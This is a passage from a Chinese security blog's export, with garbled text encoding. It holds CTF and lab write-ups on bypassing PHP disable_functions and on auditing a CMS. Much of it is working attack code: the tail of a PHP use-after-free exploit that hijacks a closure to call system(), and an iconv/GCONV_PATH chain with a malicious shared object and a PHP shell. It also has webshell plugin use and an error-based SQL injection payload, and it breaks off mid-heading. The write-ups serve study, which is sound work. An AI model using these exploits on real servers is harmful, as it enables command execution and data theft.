class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å’Œä¸Šé¢ä¸€æ ·æŠŠexpè´´è¿›å»å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703190.png" alt="image-20231206170347121"><br>åˆ©ç”¨æ’ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703964.png" alt="image-20231206170354905"></p><h2 id="åˆ©ç”¨iconv"><a href="#åˆ©ç”¨iconv" class="headerlink" title="åˆ©ç”¨iconv"></a>åˆ©ç”¨iconv</h2><h3 id="åˆ©ç”¨æ¡ä»¶-11"><a href="#åˆ©ç”¨æ¡ä»¶-11" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li><code>putenv</code></li><li><code>iconv</code></li><li>å­˜åœ¨å¯å†™çš„ç›®å½•, éœ€è¦ä¸Šä¼  <code>.so</code> æ–‡ä»¶</li></ul><h3 id="åˆ©ç”¨åŸç†-2"><a href="#åˆ©ç”¨åŸç†-2" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859?ops_request_misc=&request_id=&biz_id=102&utm_term=iconv%20%E7%BB%95%E8%BF%87%20disable_function&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117911859.pc_search_mgc_flag&spm=1018.2226.3001.4187">ä½¿ç”¨GCONV_PATHä¸iconvè¿›è¡Œbypass disable_functions_gconv-modules_lesion__çš„åšå®¢-CSDNåšå®¢</a></p><blockquote><p>iconvæ˜¯ä¸€ä¸ªè®¡ç®—æœºç¨‹åºä»¥åŠä¸€å¥—åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£çš„åç§°ã€‚ ä½œä¸ºåº”ç”¨ç¨‹åºçš„iconvé‡‡ç”¨å‘½ä»¤è¡Œç•Œé¢ï¼Œå…è®¸å°†æŸç§ç‰¹å®šç¼–ç çš„æ–‡ä»¶è½¬æ¢ä¸ºå¦ä¸€ç§ç¼–ç ã€‚</p></blockquote><p>æ„Ÿè§‰å°±æ˜¯è½¬æ¢ç¼–ç çš„ä¸€ä¸ªä¸œè¥¿å§ï¼Œåˆ©ç”¨åŸç†ä¹Ÿæ˜¯å’ŒLD_PRELOADå·®ä¸å¤šï¼Œå‚è€ƒä¸Šé¢æ–‡ç« å³å¯ï¼Œè¿™é‡Œå†æŠŠä¸Šé¢æ–‡ç« ä¸­çš„bypassè¿‡ç¨‹è´´ä¸€ä¸‹æ–¹ä¾¿ä»¥åè‡ªå·±çœ‹</p><blockquote><p>æˆ‘ä»¬çš„åˆ©ç”¨æ–¹å¼å°±æ˜¯é¦–å…ˆåœ¨æŸä¸€æ–‡ä»¶å¤¹ï¼ˆä¸€èˆ¬æ˜¯&#x2F;tmpï¼‰ä¸­ä¸Šä¼ gconv-modulesæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­æŒ‡å®šæˆ‘ä»¬è‡ªå®šä¹‰çš„å­—ç¬¦é›†æ–‡ä»¶çš„.soï¼Œç„¶åæˆ‘ä»¬å†åœ¨.soæ–‡ä»¶ä¸­çš„gonv_init()å‡½æ•°ä¸­ä¹¦å†™å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¹‹åä¸Šä¼ phpçš„shellï¼Œå†…å®¹æ˜¯ä½¿ç”¨phpè®¾å®šGCONV_PATHæŒ‡å‘æˆ‘ä»¬çš„gconv-modulesæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨iconvå‡½æ•°ä½¿æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰§è¡Œã€‚</p></blockquote><h3 id="åˆ©ç”¨æ–¹æ³•-6"><a href="#åˆ©ç”¨æ–¹æ³•-6" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>ç¯å¢ƒä½¿ç”¨ctfhubä¸Šçš„<br>å…ˆä¸Šä¼ gconv-modulesæ–‡ä»¶äº&#x2F;tmpæ–‡ä»¶å¤¹ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module  è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰//    INTERNAL    ../../../../../../../../tmp/è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2</span><br><span class="line">module  INTERNAL    è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰//    ../../../../../../../../tmp/è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2</span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">module  HACK//    INTERNAL    ../../../../../../../../tmp/hack    2</span><br><span class="line">module  INTERNAL    HACK//    ../../../../../../../../tmp/hack    2</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è¯¥æ–‡ä»¶è‡³&#x2F;tmpæ–‡ä»¶å¤¹ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704195.png" alt="image-20231206170412144"><br>å†ç¼–å†™ä¸€ä¸ª.cæ–‡ä»¶å¦‚hack.c</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv_init</span>() &#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸º.soæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åˆ°tmpä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704267.png" alt="image-20231206170421215"><br>ç„¶ååœ¨webç›®å½•ä¸‹ç›´æ¥å»ºä¸ªshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;hack&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704313.png" alt="image-20231206170429257"><br>ç„¶åè®¿é—®å³å¯ï¼Œå›èšå‰‘åœ¨tmpä¸‹çœ‹åˆ°flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704106.png" alt="image-20231206170436046"><br>ä¹Ÿå¯ç›´æ¥ç”¨èšå‰‘çš„æ’ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704900.png" alt="image-20231206170442786"><br>æ‰§è¡Œåä¼šåœ¨webç›®å½•ä¸‹ç”Ÿæˆä¸ª<code>.antproxy.php</code>ç„¶åç”¨åŒæ ·çš„å¯†ç è¿æ¥è¿™ä¸ªshellå³å¯æ‰§è¡Œå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704752.png" alt="image-20231206170458672"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/10057#toc-3">bypass disable_functionså§¿åŠ¿æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a><br><a href="https://cloud.tencent.com/developer/article/1524489">Windowså¹³å°çš„PHPä¹‹å¼€å¯COMé…ç½®-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484214&idx=1&sn=0c00e6110d43ba82ac62296f808a119c&chksm=c0e63829f791b13f6561923d93725d070c0a0d27c48454d7fae47029d4e07596895421a0e47c&mpshare=1&scene=23&srcid=1115iVMa0GWptV9GZIyeuXEE&sharer_shareinfo=8fd12347e87a45e20619288ad6b14509&sharer_shareinfo_first=8fd12347e87a45e20619288ad6b14509#rd">ä»ç»•è¿‡disable_functionsåˆ°å…³äºsoçš„ä¸€äº›æƒ³æ³• (qq.com)</a><br><a href="https://blog.csdn.net/qq_51295677/article/details/124338635#:~:text=%E5%B7%A7%E7%94%A8mail%20%28%29%26LD_PRELOAD%E5%8A%AB%E6%8C%81%20%E5%9C%A8%E4%B8%8A%E7%AF%87das%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E6%8F%90%E5%88%B0%E8%BF%87%E5%88%B0%20mail%20%E5%87%BD%E6%95%B0%EF%BC%8C,mail%20%E5%87%BD%E6%95%B0%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E5%BD%93%E4%BD%BF%E7%94%A8%E5%88%B0%E8%BF%99%E7%8E%A9%E6%84%8F%E5%84%BF%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%20%2Fusr%2Fsbin%2Fsendmail%20%EF%BC%8C%E6%88%91%E4%BB%AC%E5%A6%82%E6%9E%9C%E8%83%BD%E5%8A%AB%E6%8C%81%E5%88%B0%20sendmail%20%E8%A7%A6%E5%8F%91%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%BE%E5%88%B0%E6%88%91%E4%BB%AC%E4%B9%8B%E5%89%8D%E8%AE%B2%E7%9A%84%E9%82%A3%E4%B8%AA%E7%9B%AE%E7%9A%84%E4%BA%86%E3%80%82">æµ…è°ˆLD_PRELOADåŠ«æŒ_unset ld_preload_errorr0çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.freebuf.com/web/192052.html">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><br><a href="https://www.cnblogs.com/leixiao-/p/10612798.html">LD_PRELOAD &amp; putenv() ç»•è¿‡ disable_functions &amp; open_basedir - æ·šç¬‘ - åšå®¢å›­ (cnblogs.com)</a><br><a href="https://blog.csdn.net/weixin_63231007/article/details/129105223">PHP7.4 FFI æ‰©å±•å®‰å…¨é—®é¢˜_è‘«èŠ¦å¨ƒ42çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://cloud.tencent.com/developer/article/1838766">Webå®‰å…¨ | Fastcgi åè®®åˆ†æä¸ PHP-FPM æ”»å‡»æ–¹æ³•-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¢¦æƒ³CMS 1.4ä»£ç å®¡è®¡å­¦ä¹ </title>
      <link href="/2023/08/%E6%A2%A6%E6%83%B3CMS-1-4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/%E6%A2%A6%E6%83%B3CMS-1-4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€äº›å®¡è®¡æ–¹æ³•"><a href="#ä¸€äº›å®¡è®¡æ–¹æ³•" class="headerlink" title="ä¸€äº›å®¡è®¡æ–¹æ³•"></a>ä¸€äº›å®¡è®¡æ–¹æ³•</h2><p>å¯¹äºæœªå…¬å¼€POCçš„1dayå¤ç°ï¼Œç›´æ¥çœ‹cnvdçš„æäº¤ï¼Œæˆ‘ä»¬è¿™é‡Œå®¡è®¡æ¢¦æƒ³CMS 1.4æ‰€ä»¥ç›´æ¥æœç´¢å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158834.png" alt="image-20230828215700457"><br>å¯ä»¥çœ‹åˆ°å¾ˆå¤šï¼Œè™½ç„¶æ–‡ä»¶åæœªå…¨éƒ¨æ˜¾ç¤ºä½†æ˜¯å°±é‚£å‡ ä¸ªæ–‡ä»¶ï¼Œæ˜¾ç¤ºäº†å¤§éƒ¨åˆ†å­—æ¯å°±èƒ½æ‰¾åˆ°äº†ï¼Œè¿™æ˜¯å¤ç°1dayçš„æ–¹æ³•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥æ‹¿æœ€æ–°ç‰ˆæœ¬å®¡0day</p><h2 id="BookAction-class-phpä¸‹sqlæ³¨å…¥"><a href="#BookAction-class-phpä¸‹sqlæ³¨å…¥" class="headerlink" title="BookAction.class.phpä¸‹sqlæ³¨å…¥"></a>BookAction.class.phpä¸‹sqlæ³¨å…¥</h2><p>è¿™ä¸ªç³»ç»Ÿæ˜¯ä¸ªMVCæ¶æ„ï¼Œemmmä¸å¤ªäº†è§£å¾—æ‰¾æ—¶é—´å­¦å­¦äº†ï¼Œä¸ç„¶ä»£å®¡æœ‰ç‚¹éš¾ï¼Œå…ˆæ¥çœ‹ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸‹çš„æ³¨å…¥åœ¨replyæ–¹æ³•ä¸‹GETæ¥æ”¶ä¸€ä¸ªid<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158710.png" alt="image-20230828215835650"><br>ç›´æ¥è·Ÿè¿›getReplyçœ‹çœ‹æ‰¾åˆ°åº•å±‚çš„sqlè¯­å¥ï¼Œæœ€ç»ˆåœ¨db.class.phpæ‰¾åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158745.png" alt="image-20230828215852668"><br>å¯ä»¥çœ‹åˆ°ç›´æ¥æ‹¼æ¥äº†fieldå³ä¸€å¼€å§‹çš„idï¼Œè€Œä¸”è¿™ä¸ªæ•´ä¸ªé¡¹ç›®çš„sqlè°ƒç”¨éƒ½åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªåº•å±‚çš„sqlè°ƒç”¨æ²¡æœ‰åšé¢„ç¼–è¯‘ï¼Œé‚£ä¹ˆä½ å°±å¾—åœ¨ç”¨çš„æ—¶å€™å»å†™è¿™æ ·å°±å¾ˆå®¹æ˜“é—æ¼å‡ºç°sqlæ³¨å…¥ï¼Œåœ¨è¿™é‡Œæ‰“å°ä¸€ä¸‹sqlè¯­å¥æ–¹ä¾¿è°ƒè¯•ï¼Œæ¥åˆ°è¿™ä¸ªBookAction.class.phpæ–‡ä»¶ä¸‹è¿›å…¥replyæ–¹æ³•ä¼ ä¸ªid<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159085.png" alt="image-20230828215908038"><br>ç›´æ¥é—­åˆä¸€ä¸‹ï¼Œè¿™é‡Œå¾—ç”¨<code>)</code>é—­åˆï¼Œä»sqlè¯­å¥å³å¯çœ‹å‡ºï¼Œç„¶åç”¨æŠ¥é”™æ³¨å…¥æ³¨ä¸€ä¸‹ç‰ˆæœ¬ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">or</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,version()),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>urlç¼–ç ä¸€ä¸‹æ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159837.png" alt="image-20230828215920773"><br>æ³¨å…¥æˆåŠŸï¼Œåå°çš„æ³¨å…¥è™½ç„¶ç®€å•ï¼Œä½†æ˜¯å±å®³ä¸å¤§ï¼Œæ²¡æœ‰å¼±å£ä»¤è¿›å…¥åå°çš„è¯å°±æ— æ³•åˆ©ç”¨ï¼Œä¸‹é¢çœ‹çœ‹å‰å°çš„sqlæ³¨å…¥ï¼Œå› ä¸ºsqlæ³¨å…¥åŸºæœ¬ä¸Šå°±æ˜¯åœ¨å‰å°æ³¨æ‹¿åˆ°åå°çš„å¯†ç </p><h2 id="TagsAction-class-phpä¸‹çš„sqlæ³¨å…¥"><a href="#TagsAction-class-phpä¸‹çš„sqlæ³¨å…¥" class="headerlink" 